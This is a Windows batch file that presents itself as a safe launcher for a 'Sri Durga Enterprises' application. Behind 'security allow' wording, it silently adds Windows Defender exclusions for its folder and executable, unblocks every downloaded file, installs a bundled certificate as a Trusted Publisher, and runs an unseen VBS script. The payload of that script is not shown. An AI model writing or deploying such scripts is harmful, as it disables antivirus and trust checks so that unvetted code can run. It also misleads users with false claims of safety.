@echo off
title Sri Durga Enterprises - Auto Allow and Run Safe App
color 0A
echo ===============================================================================
echo            SRI DURGA ENTERPRISES - AUTOMATIC SECURITY ALLOW ^& RUN
echo ===============================================================================
echo.
echo [1/3] Adding Windows Defender exclusions for Sri Durga Enterprises...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%~dp0' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'Sri Durga Enterprises.exe' -ErrorAction SilentlyContinue; Get-ChildItem -Path '%~dp0' -Recurse | Unblock-File -ErrorAction SilentlyContinue" >nul 2>&1
echo       [OK] Exclusions and File Unblock applied.

echo.
echo [2/3] Registering Verified Security Certificate...
if exist "%~dp0SriDurgaEnterprises.cer" (
    certutil -user -addstore -f "TrustedPublisher" "%~dp0SriDurgaEnterprises.cer" >nul 2>&1
    echo       [OK] Sri Durga Enterprises registered as Trusted Publisher.
)

echo.
echo [3/3] Launching Sri Durga Enterprises Application in 100% Safe Mode...
start "" "%~dp0Launch-Sri-Durga-App.vbs"

echo.
echo ===============================================================================
echo             SUCCESS! APPLICATION IS NOW UNBLOCKED AND RUNNING
echo ===============================================================================
timeout /t 3 >nul
exit /b 0
